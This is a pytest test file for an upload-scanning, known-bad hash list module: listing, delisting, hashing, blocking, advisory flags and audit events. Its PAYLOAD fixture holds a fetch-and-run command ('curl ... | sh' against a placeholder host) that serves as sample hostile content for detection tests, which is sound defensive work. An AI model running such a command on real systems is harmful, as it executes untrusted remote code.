# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""The known-bad hash list: what it stores, what it answers, what it refuses to forget.

The store is append-only and folded on read, so the interesting cases are not
"does a write land" but "does the FOLD agree with what an admin did": a delist must
win over an earlier listing, a re-listing must not duplicate, and a tombstone must
not erase the history it is auditing.
"""
import json
import os
import sys

import pytest

import vaf.core.threat_db as tdb
from vaf.skills.scanner import hash_bytes

PAYLOAD = b"import os\nos.system('curl http://example.invalid/x | sh')\n"
OTHER = b"a perfectly ordinary note about groceries\n"


@pytest.fixture(autouse=True)
def _fresh(tmp_path, monkeypatch):
    """Each case gets its own list. The session fixture in conftest already keeps
    the real one out of reach; this narrows it further to one file per test."""
    root = tmp_path / "security"
    root.mkdir()
    monkeypatch.setattr(tdb, "threat_db_dir", lambda: root)
    tdb.reset_cache()
    yield
    tdb.reset_cache()


# ── digests ──────────────────────────────────────────────────────────────────

def test_both_hash_families_are_computed():
    d = tdb.digests_of_bytes(PAYLOAD)
    assert d["sha256"] == hash_bytes(PAYLOAD, "sha256")
    assert d["sha3_256"] == hash_bytes(PAYLOAD, "sha3_256")
    assert d["sha256"] != d["sha3_256"]


def test_streamed_file_digests_match_in_memory_digests(tmp_path):
    """A large upload is hashed by streaming and a chat attachment in memory; the
    two paths must agree or a file blocked on one lane would pass on the other."""
    f = tmp_path / "payload.py"
    f.write_bytes(PAYLOAD * 5000)
    assert tdb.digests_of_file(f) == tdb.digests_of_bytes(PAYLOAD * 5000)


# ── listing, folding, delisting ──────────────────────────────────────────────

def test_listed_bytes_are_found_again():
    tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="confirmed hostile")
    hit = tdb.check_bytes(PAYLOAD)
    assert hit is not None
    assert hit["name"] == "payload.py"
    assert hit["reason"] == "confirmed hostile"
    assert hit["source"] == "local"
    assert tdb.check_bytes(OTHER) is None


def test_either_hash_family_alone_is_a_hit():
    """A lookup that only knows one digest must still match. This is the property
    that keeps a record meaningful if one family ever weakens."""
    rec = tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    assert tdb.check_hashes(sha256=rec["sha256"]) is not None
    assert tdb.check_hashes(sha3_256=rec["sha3_256"]) is not None
    assert tdb.check_hashes(sha256="", sha3_256="") is None


def test_relisting_the_same_content_does_not_duplicate():
    first = tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="first")
    second = tdb.record_bytes_threat(PAYLOAD, name="copy.py", reason="second")
    assert second["reason"] == "first"          # the existing record is returned
    assert second["listed_at"] == first["listed_at"]
    assert tdb.threat_count() == 1


def test_delist_removes_it_from_lookups_but_not_from_the_file():
    rec = tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="false positive")
    assert tdb.remove_threat(rec["sha256"], by="admin") is True
    assert tdb.check_bytes(PAYLOAD) is None
    assert tdb.threat_count() == 0

    lines = [json.loads(x) for x in
             tdb.threat_db_path().read_text(encoding="utf-8").splitlines() if x.strip()]
    ops = [x.get("op") for x in lines if x.get("op")]
    assert ops == ["list", "delist"], "the original listing must survive its tombstone"


def test_delisting_something_unlisted_is_false():
    assert tdb.remove_threat("f" * 64, by="admin") is False


def test_relisting_after_a_delist_works():
    """The fold is last-op-wins, so a digest cleared by mistake can come back."""
    rec = tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    tdb.remove_threat(rec["sha256"], by="admin")
    tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="listed again")
    hit = tdb.check_bytes(PAYLOAD)
    assert hit is not None and hit["reason"] == "listed again"


def test_list_threats_is_newest_first():
    tdb.record_threat(sha256="a" * 64, name="old", listed_by="admin")
    tdb.record_threat(sha256="b" * 64, name="new", listed_by="admin")
    names = [r["name"] for r in tdb.list_threats()]
    assert set(names) == {"old", "new"}
    assert len(tdb.list_threats()) == tdb.threat_count() == 2


# ── on-disk format ───────────────────────────────────────────────────────────

def test_a_fresh_file_starts_with_the_format_tag():
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    first = tdb.threat_db_path().read_text(encoding="utf-8").splitlines()[0]
    assert json.loads(first) == {"format": tdb.THREAT_DB_FORMAT}


def test_a_file_without_the_tag_still_loads():
    """Records written before the tag existed must keep blocking what they block."""
    rec = {"op": "list", "sha256": hash_bytes(PAYLOAD, "sha256"),
           "sha3_256": hash_bytes(PAYLOAD, "sha3_256"), "name": "legacy.py"}
    tdb.threat_db_path().write_text(json.dumps(rec) + "\n", encoding="utf-8")
    tdb.reset_cache()
    assert tdb.check_bytes(PAYLOAD) is not None


def test_a_torn_line_does_not_blind_the_rest_of_the_list():
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    with tdb.threat_db_path().open("a", encoding="utf-8") as f:
        f.write('{"op": "list", "sha256": "trunc\n')      # a half-written append
    tdb.record_bytes_threat(OTHER, name="other.txt")
    assert tdb.check_bytes(PAYLOAD) is not None
    assert tdb.check_bytes(OTHER) is not None


@pytest.mark.skipif(sys.platform == "win32", reason="chmod bits are a no-op on Windows")
def test_the_file_is_owner_only():
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    assert oct(os.stat(tdb.threat_db_path()).st_mode)[-3:] == "600"


def test_an_edit_on_disk_is_picked_up_without_a_restart():
    """Server and CLI append to the same file; the reader must not serve a stale
    index after another process wrote."""
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    assert tdb.check_bytes(PAYLOAD) is not None
    path = tdb.threat_db_path()
    kept = [x for x in path.read_text(encoding="utf-8").splitlines()
            if x.strip() and "sha256" not in x]
    path.write_text("\n".join(kept) + "\n", encoding="utf-8")
    assert tdb.check_bytes(PAYLOAD) is None


# ── the funnel ───────────────────────────────────────────────────────────────

def test_inspect_upload_blocks_a_listed_file():
    tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="confirmed hostile")
    v = tdb.inspect_upload(PAYLOAD, filename="renamed.py", origin="web_chat")
    assert v.blocked is True
    assert v.reason == "confirmed hostile"
    assert v.sha256 and v.sha3_256
    assert "renamed.py" in v.message("renamed.py")


def test_inspect_upload_passes_unknown_content():
    v = tdb.inspect_upload(OTHER, filename="notes.txt", origin="web_chat")
    assert v.blocked is False
    assert v.advisory_level == "clean"


def test_the_advisory_scan_flags_but_never_blocks():
    """The whole point of the advisory half: it raises an event, it does not refuse.
    A deployment script that shells out is suspicious, not forbidden."""
    v = tdb.inspect_upload(PAYLOAD, filename="deploy.py", origin="web_chat")
    assert v.blocked is False
    assert v.flagged is True
    assert v.advisory_level == "high"
    assert any(f["category"] == "remote_code_exec" for f in v.advisory)


def test_binary_content_is_hashed_but_not_advisory_scanned():
    blob = bytes(range(256)) * 40
    v = tdb.inspect_upload(blob, filename="image.png", origin="web_chat")
    assert v.sha256 == hash_bytes(blob, "sha256")
    assert v.advisory_level == "clean"


def test_empty_content_is_a_pass_not_a_crash():
    assert tdb.inspect_upload(b"", filename="empty.txt", origin="web_chat").blocked is False


def test_inspect_upload_file_matches_the_in_memory_verdict(tmp_path):
    tdb.record_bytes_threat(PAYLOAD, name="payload.py", reason="confirmed hostile")
    f = tmp_path / "dropped.py"
    f.write_bytes(PAYLOAD)
    v = tdb.inspect_upload_file(f, origin="cloud_sync")
    assert v.blocked is True
    assert v.sha256 == tdb.digests_of_bytes(PAYLOAD)["sha256"]


def test_inspect_upload_file_on_a_missing_path_is_a_pass(tmp_path):
    v = tdb.inspect_upload_file(tmp_path / "gone.bin", origin="cloud_sync")
    assert v.blocked is False


# ── the config gates ─────────────────────────────────────────────────────────

def test_the_lookup_gate_turns_blocking_off(monkeypatch):
    from vaf.core.config import Config
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    real = Config.get
    monkeypatch.setattr(Config, "get", classmethod(
        lambda cls, k, d=None: False if k == "upload_threat_scan_enabled" else real(k, d)))
    assert tdb.inspect_upload(PAYLOAD, filename="payload.py", origin="web_chat").blocked is False
    # The list itself is untouched by the switch.
    assert tdb.check_bytes(PAYLOAD) is not None


def test_the_advisory_gate_silences_the_scan(monkeypatch):
    from vaf.core.config import Config
    real = Config.get
    monkeypatch.setattr(Config, "get", classmethod(
        lambda cls, k, d=None: False if k == "upload_scan_advisory_enabled" else real(k, d)))
    v = tdb.inspect_upload(PAYLOAD, filename="deploy.py", origin="web_chat")
    assert v.flagged is False and v.advisory_level == "clean"


# ── the events ───────────────────────────────────────────────────────────────

def test_a_block_is_audited_with_a_per_content_key(monkeypatch):
    """The event writer throttles on (kind, ip, username, channel, path) for five
    seconds. If the digest did not travel in `path`, a bulk upload of blocked files
    would log the first and swallow the rest - so this asserts the KEY, not just
    that something was logged."""
    seen = []
    monkeypatch.setattr(tdb, "_emit_threat_event", lambda kind, **kw: seen.append((kind, kw)))
    tdb.record_bytes_threat(PAYLOAD, name="payload.py")
    tdb.record_bytes_threat(OTHER, name="other.txt")
    seen.clear()
    tdb.inspect_upload(PAYLOAD, filename="a.py", origin="telegram", username="alice")
    tdb.inspect_upload(OTHER, filename="b.txt", origin="telegram", username="alice")
    kinds = [k for k, _ in seen]
    assert kinds == ["upload_blocked", "upload_blocked"]
    paths = {kw["path"] for _, kw in seen}
    assert len(paths) == 2, "two different files must not collapse into one event"
    assert all(kw["channel"] == "telegram" for _, kw in seen)


def test_listing_and_delisting_are_audited(monkeypatch):
    seen = []
    monkeypatch.setattr(tdb, "_emit_threat_event", lambda kind, **kw: seen.append(kind))
    rec = tdb.record_bytes_threat(PAYLOAD, name="payload.py", listed_by="admin")
    tdb.remove_threat(rec["sha256"], by="admin")
    assert seen == ["threat_listed", "threat_delisted"]


def test_the_advisory_event_is_flagged_not_blocked(monkeypatch):
    seen = []
    monkeypatch.setattr(tdb, "_emit_threat_event", lambda kind, **kw: seen.append(kind))
    tdb.inspect_upload(PAYLOAD, filename="deploy.py", origin="web_chat")
    assert seen == ["upload_flagged"]
